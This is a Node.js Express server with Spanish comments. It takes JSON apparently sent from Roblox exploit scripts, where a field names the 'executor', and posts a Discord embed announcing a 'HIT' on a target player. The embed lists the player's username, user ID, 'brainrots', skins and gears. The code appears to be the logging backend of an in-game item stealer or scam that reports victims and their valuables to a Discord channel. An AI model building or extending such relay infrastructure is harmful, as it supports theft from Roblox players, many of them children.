require('dotenv').config();
const express = require('express');
const axios = require('axios');

const app = express();
app.use(express.json());

// Middleware de seguridad (API Key)
app.use((req, res, next) => {
  const authHeader = req.headers.authorization;
  if (process.env.API_KEY && authHeader !== `Bearer ${process.env.API_KEY}`) {
    return res.status(401).json({ error: 'No autorizado' });
  }
  next();
});

// Endpoint único para recibir datos de Roblox
app.post('/transform', async (req, res) => {
  try {
    const data = req.body;
    const embed = buildHitEmbed(data);

    // Enviar al webhook de HITS (definido en variables de entorno)
    await axios.post(process.env.DISCORD_WEBHOOK_URL, {
      embeds: [embed]
    });

    res.json({ status: 'ok', message: 'Mensaje enviado a Discord' });
  } catch (error) {
    console.error(error);
    res.status(500).json({ error: 'Error al procesar la solicitud' });
  }
});

// Función que construye el Embed para el HIT
function buildHitEmbed(data) {
  // data esperado:
  // {
  //   type: "hit",
  //   target: { userId: number, username: string },
  //   brainrots: [string, ...],
  //   baseSkins: [string, ...],
  //   gears: [string, ...],
  //   server: string,
  //   players: number,
  //   executor: string,
  //   timestamp: string
  // }

  const target = data.target || {};
  const brainrotList = data.brainrots?.join('\n') || 'Ninguno';
  const skinsList = data.baseSkins?.join('\n') || 'Ninguno';
  const gearsList = data.gears?.join('\n') || 'Ninguno';
  const footer = `Servidor: ${data.server || '?'} | Jugadores: ${data.players || '?'} | Ejecutor: ${data.executor || '?'} | ${data.timestamp || ''}`;

  return {
    title: `🎯 HIT a ${target.username || 'Desconocido'} (${target.userId || '?'})`,
    color: 0x2ecc71, // verde para HITS
    fields: [
      {
        name: '🧠 Brainrots',
        value: brainrotList,
        inline: false
      },
      {
        name: '🎒 Base Skins',
        value: skinsList,
        inline: true
      },
      {
        name: '⚙️ Gears',
        value: gearsList,
        inline: true
      }
    ],
    footer: {
      text: footer
    },
    timestamp: new Date().toISOString()
  };
}

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`API escuchando en puerto ${PORT}`));
